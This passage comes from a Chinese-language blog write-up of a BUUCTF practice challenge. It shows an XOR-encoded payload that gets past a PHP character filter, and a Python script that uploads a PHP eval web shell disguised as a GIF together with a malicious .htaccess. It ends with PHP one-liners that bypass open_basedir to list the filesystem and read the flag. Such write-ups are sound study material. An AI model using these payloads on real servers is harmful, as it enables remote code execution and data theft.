j.to_bytes(<span class="number">1</span>,byteorder=<span class="string">'big'</span>)</span><br><span class="line">            a = urllib.parse.quote(a)</span><br><span class="line">            b = urllib.parse.quote(b)</span><br><span class="line">            print(<span class="string">"%s:%s^%s"</span>%(result,a,b))</span><br></pre></td></tr></table></figure>

<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">_:<span class="built_in">%FF</span><span class="symbol">^%A0</span></span><br><span class="line">T:<span class="built_in">%FF</span><span class="symbol">^%AB</span></span><br><span class="line">G:<span class="built_in">%FF</span><span class="symbol">^%B8</span></span><br><span class="line">E:<span class="built_in">%FF</span><span class="symbol">^%BA</span></span><br></pre></td></tr></table></figure>

<p>然后构造<code>/?_=$花括号%FF%FF%FF%FF^%A0%B8%BA%AB花括号花括号%FF花括号();&amp;%FF=get_the_flag</code>即可</p>
<p>这里<code>hexo</code>标签问题不能用<code>{}</code>包裹，否则生成文件会出错。。。</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>然后上传</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">"http://1df5ccd8-384f-4d4a-b111-e6b095e90311.node3.buuoj.cn/?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%FF&#125;();&amp;%FF=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">ma = <span class="string">b"GIF89a12"</span> + base64.b64encode(<span class="string">b"&lt;?php eval($_REQUEST['a']);?&gt;"</span>)</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b'''</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .aa</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=a2u13.aa"</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">ma_file = &#123;</span><br><span class="line">    <span class="string">"file"</span>:(<span class="string">"a2u13.aa"</span>,ma,<span class="string">'image/gif'</span>)</span><br><span class="line">&#125;</span><br><span class="line">htaccess_file = &#123;</span><br><span class="line">    <span class="string">"file"</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c = session.post(url=url,files=ma_file).text</span><br><span class="line"></span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line">c = session.post(url=url,files=htaccess_file).text</span><br><span class="line"></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228190549.png" alt=""></p>
<p>然后搜了一下<code>flag</code>竟然直接搜到<code>flag</code>了。。。。</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228190623.png" alt=""></p>
<p>不过好像是非预期</p>
<p>正常的话好像过滤了命令执行函数<code>system</code>等等</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228191035.png" alt=""></p>
<p>得依靠<code>file_get_contents</code>等函数来读</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228191112.png" alt=""></p>
<p>这里限制了<code>open_basedir</code>，得绕过去</p>
<p><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span>(scandir(<span class="string">"/"</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228191331.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(file_get_contents(<span class="string">"/THis_Is_tHe_F14g"</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228191518.png" alt=""></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">A2u13</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://a2u13.com/2020/02/17/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/">https://a2u13.com/2020/02/17/BUUCTF刷题笔记（五）/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://a2u13.com" target="_blank">A2u13's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a></div><div class="post_share"><div class="social-share" data-image="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222936.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/02/18/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88DC-1%EF%BC%89/"><img class="prev_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529224810.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Vulnhub靶机渗透测试（DC-1）</div></div></a></div><div class="next-post pull_right"><a href="/2020/02/15/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"><img class="next_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF刷题笔记（四）</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/02/12/BUUCTF刷题笔记（一）/" title="BUUCTF刷题笔记（一）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-12</div><div class="relatedPosts_title">BUUCTF刷题笔记（一）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/13/BUUCTF刷题笔记（三）/" title="BUUCTF刷题笔记（三）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-13</div><div class="relatedPosts_title">BUUCTF刷题笔记（三）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/12/BUUCTF刷题笔记（二）/" title="BUUCTF刷题笔记（二）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-12</div><div class="relatedPosts_title">BUUCTF刷题笔记（二）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/28/BUUCTF刷题笔记（六）/" title="BUUCTF刷题笔记（六）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-28</div><div class="relatedPosts_title">BUUCTF刷题笔记（六）</div></div></a></div><div class="relatedPosts_item"><a href="/2020/02/15/BUUCTF刷题笔记（四）/" title="BUUCTF刷题笔记（四）"><img class="relatedPosts_cover" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-02-15</div><div class="relatedPosts_title">BUUCTF刷题笔记（四）</div></div></a></div></div><div class="clear_both"></div></div></article></main><footer id="footer" style="background-image: url(https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2020 By A2u13</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {
      pangu.spacingElementById('content-inner')
})</script><script src="/js/search/local-search.js"></script></body></html>